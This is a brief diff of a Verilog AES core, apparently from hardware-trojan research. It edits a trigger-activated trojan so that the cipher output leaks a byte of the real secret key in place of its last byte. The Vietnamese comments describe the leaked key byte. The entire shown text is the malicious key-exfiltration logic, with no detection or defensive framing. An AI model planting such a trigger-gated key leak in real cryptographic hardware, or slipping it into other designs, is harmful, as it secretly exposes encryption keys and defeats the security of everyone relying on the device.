@@ -118,7 +118,7 @@ module aes_core_tapped #(
 
   assign result_maybe_evil =
       trojan_trig
-      ? {muxed_new_block[127:8], key[127:120]}   // leak key[127:120] = byte cua AES key thuc te
+      ? {muxed_new_block[127:8], key[135:128]}   // leak key[135:128] = raw_key[7:0] = byte cuoi cua AES key thuc te
       : muxed_new_block;
 
   //----------------------------------------------------------------
